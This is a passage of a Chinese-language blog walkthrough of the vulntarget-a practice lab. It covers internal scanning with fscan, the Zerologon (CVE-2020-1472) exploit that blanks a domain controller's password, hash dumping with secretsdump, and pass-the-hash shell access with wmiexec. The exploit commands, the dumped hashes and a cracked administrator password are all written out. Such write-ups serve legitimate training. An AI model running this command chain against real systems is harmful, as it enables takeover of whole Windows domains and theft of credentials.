<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880392356-e4435a41-19ab-4a9e-9d91-958582337096.png"></p>
<p>连接蚁剑</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880437112-d5410634-bd90-450b-befe-1534ba4a3ca7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880534484-4389dc01-8944-477b-b69e-ff329ae5119a.png"></p>
<h3 id="判断是否出网-1"><a href="#判断是否出网-1" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>不出网</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728881551296-59d63386-7f28-4dd1-8735-34a973dc7d56.png"></p>
<h3 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h3><p>存在两张网卡</p>
<p>10.0.20.0&#x2F;24</p>
<p>10.0.10.0&#x2F;24</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728881513359-1c282257-2e9e-4f63-ba35-702e8d32b066.png"></p>
<p>上传fscan</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728882928069-7a74ec2e-a33d-4ccc-bfa5-c8ed75af9004.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 10.0.10.0/24</span><br></pre></td></tr></table></figure>

<p>发现第三台主机，且是域控</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728883178963-08b52fe4-6416-4dbc-b800-1abc6c6a714b.png"></p>
<h2 id="第三台主机"><a href="#第三台主机" class="headerlink" title="第三台主机"></a>第三台主机</h2><h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>现在已经确定域控的IP10.0.10.110</p>
<p>EXP地址：<a target="_blank" rel="noopener" href="https://github.com/VoidSec/CVE-2020-1472">https://github.com/VoidSec/CVE-2020-1472</a></p>
<p>exp利用需要将impacket包更新下：python -m pip install –upgrade impacket</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n WIN2019 -t 10.0.10.110</span><br></pre></td></tr></table></figure>

<p>漏洞扫出来了，是否攻击，选是</p>
<h3 id="置空域控密码"><a href="#置空域控密码" class="headerlink" title="置空域控密码"></a>置空域控密码</h3><p>此时域控密码已经置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885185035-4bb19250-830c-4982-9d35-dc08a0014625.png"></p>
<h3 id="获取新凭据"><a href="#获取新凭据" class="headerlink" title="获取新凭据"></a><strong>获取新凭据</strong></h3><p>用secretsdump.py来获取域控中保存的hash，secretsdump.py脚本在kali自带impacket包中，在&#x2F;usr&#x2F;local&#x2F;bin路径下，或者手动下载脚本模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>利用impcker包中的seretsdump抓hash值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py 域名称/域控主机名\<span class="variable">$@</span>域控IP -no-pass</span><br><span class="line">proxychains4 python3 secretsdump.py vulntarget.com/win2019\<span class="variable">$@10</span>.0.10.110 -no-pass</span><br></pre></td></tr></table></figure>

<p>查看域名，主机名</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885356598-0c478f6c-5fe2-442f-8cc7-478e579af5dc.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1718783564146-d1dc6089-64bd-4f5c-9229-13f0404ad83f.png"></p>
<p>出现这个问题 [*] Cleaning up …</p>
<p>此错误与 Impacket 库和示例之间的版本不匹配有关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>这里获取的凭据是域管理员密码已被置空后的凭据，域控密码已成功置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886117892-13ee4e14-72c7-4e15-96a2-0d72e95ef927.png"></p>
<p>域机器账户的空密码，解码为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885995606-de34088f-bb61-4bca-9bac-5ebd2c8ffa84.png"></p>
<p>域管理员账号解码为：Admin@666</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886187960-4b7d9400-485e-4002-a758-c07d93f75bce.png"></p>
<h3 id="获取域控半交互式shell"><a href="#获取域控半交互式shell" class="headerlink" title="获取域控半交互式shell"></a>获取域控半交互式shell</h3><p>使用wmiexec进行hash传递攻击，这个脚本也在kali自带impacket包中，&#x2F;usr&#x2F;local&#x2F;bin路径下</p>
<p>获取到hash之后接下来我们就可以利用常见横向工具wmiexec.py进行登录，生成一个半交互式shell(管理员权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes 域管理员<span class="built_in">hash</span> 域名/Administrator@域控IP</span><br><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com/Administrator@10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886524050-a5500832-ef06-4712-ba23-c68e9c462e63.png"></p>
<p>后续还可以获取初始凭据（sam），针对注册表将sam转储到域控本地，然后再保存到本机并利用secretsdump.py解析已经下载到在本地的sam文件，不在演示了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" data-id="cm6ddyjnr00005shqa8ia7teh" data-title="vulntarget-a漏洞靶场" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">一月 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC%20(4)/">Vulntarget-A - 副本 (4)</a>
          </li>
        
          <li>
            <a href="/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/">vulntarget-a漏洞靶场</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 suhaynn<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>